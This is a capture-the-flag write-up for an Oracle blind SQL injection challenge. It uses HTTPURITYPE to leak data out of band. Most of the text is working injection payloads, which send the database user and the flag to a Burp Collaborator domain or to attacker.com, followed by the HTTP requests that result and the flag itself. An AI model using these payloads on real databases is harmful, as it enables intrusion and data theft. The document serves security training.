# SQLi-040: Oracle OOB HTTP via HTTPURITYPE - Writeup

## Flag: `FLAG{oracle_httpuritype_oob}`

---

## Attack Flow

### 1. DETECT
Response không thay đổi → OOB required

### 2. IDENTIFY
Oracle với HTTPURITYPE enabled

### 3-4. ENUMERATE & EXTRACT

**Basic OOB test:**
```sql
1 AND (SELECT HTTPURITYPE('http://xxxxx.burpcollaborator.net/test').GETCLOB() FROM dual) IS NOT NULL--
```

**Extract user:**
```sql
1 AND (SELECT HTTPURITYPE('http://xxxxx.burpcollaborator.net/'||(SELECT user FROM dual)).GETCLOB() FROM dual) IS NOT NULL--
```

HTTP Request: `GET /INVOICE_USER`

### 5-6. EXFILTRATE

**Extract flag:**
```sql
1 AND (SELECT HTTPURITYPE('http://xxxxx.burpcollaborator.net/'||(SELECT value FROM flags WHERE ROWNUM=1)).GETCLOB() FROM dual) IS NOT NULL--
```

HTTP Request: `GET /FLAG{oracle_httpuritype_oob}`

🎉 **FLAG:** `FLAG{oracle_httpuritype_oob}`

---

## Key Payloads

```sql
-- Basic HTTPURITYPE
1 AND (SELECT HTTPURITYPE('http://attacker.com/').GETCLOB() FROM dual) IS NOT NULL--

-- With data exfiltration
1 AND (SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB() FROM dual) IS NOT NULL--

-- GETBLOB for binary data
1 AND (SELECT HTTPURITYPE('http://attacker.com/').GETBLOB() FROM dual) IS NOT NULL--
```
